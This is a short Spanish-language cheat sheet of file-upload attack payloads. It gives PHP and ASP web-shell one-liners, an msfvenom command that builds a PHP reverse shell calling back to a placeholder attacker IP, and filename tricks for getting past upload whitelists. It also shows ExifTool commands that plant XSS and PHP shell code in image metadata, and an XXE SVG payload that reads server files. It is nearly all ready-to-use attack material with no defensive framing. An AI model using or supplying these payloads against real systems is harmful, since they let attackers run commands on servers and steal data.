# Cheatsheet ⚙

## Shells
| Ejecución de Comandos (Básico) 👩‍💻 |
|:---:|
| **PHP:** `<?php system($_GET['cmd']); ?>` | 
| **ASP:** `<% eval request('cmd') %>` | 
| **PHP MSFVENOM:** `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` |

## Extensiones

| Evasión de WhiteList 📄 |
|:---:|
| **NULL BYTE**: `cmd.php%00.png` | 
| **Windows**: `cmd.asp:.png` |
| **Doble Extensión**: `cmd.jpg.php` |
| **Doble Extensión Reversa**: `cmd.php.jpg` |


## Usando ExifTool 🔬
| Inyecciones 💉 |
|:---:|
| **XSS**: `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' [Image]` | 
| **SHELL PHP**: `exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' [Image]` \| `mv [Image] [Image].jpeg.php` |
| **XXE** |
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=[Recurso]"> ]>
<svg>&xxe;</svg>
```


